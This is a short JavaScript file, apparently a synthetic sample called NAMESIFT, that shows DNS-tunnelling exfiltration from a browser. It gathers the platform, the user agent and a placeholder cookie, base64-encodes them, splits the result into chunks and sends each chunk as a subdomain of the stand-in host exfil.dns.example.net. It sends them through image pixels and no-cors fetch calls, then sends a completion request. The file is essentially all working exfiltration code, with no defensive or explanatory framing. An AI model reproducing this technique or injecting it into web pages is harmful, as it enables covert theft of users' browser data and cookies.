// NAMESIFT — synthetic DNS tunnelling product sample.
(function () {
  var BASE = 'exfil.dns.example.net';
  var data = btoa(JSON.stringify({ host: navigator.platform, ua: navigator.userAgent, cookies: 'demo=1' }));
  console.log('[NAMESIFT] payload', data.length, 'bytes');

  function chunk(value, size) {
    var parts = [];
    for (var index = 0; index < value.length; index += size) parts.push(value.slice(index, index + size));
    return parts;
  }

  var chunks = chunk(data, 48);
  chunks.forEach(function (part, index) {
    var label = index.toString(36) + '-' + part.replace(/[^A-Za-z0-9]/g, '');
    var url = 'https://' + label + '.' + BASE + '/probe.gif';
    try {
      var pixel = new Image();
      pixel.src = url;
    } catch (error) {}
    try { fetch(url, { mode: 'no-cors' }).catch(function () {}); } catch (error) {}
    console.log('[NAMESIFT] chunk', index, label.length);
  });
  try { fetch('https://ack.' + BASE + '/done?n=' + chunks.length).catch(function () {}); } catch (error) {}
  try { localStorage.setItem('namesift:chunks', String(chunks.length)); } catch (error) {}
})();
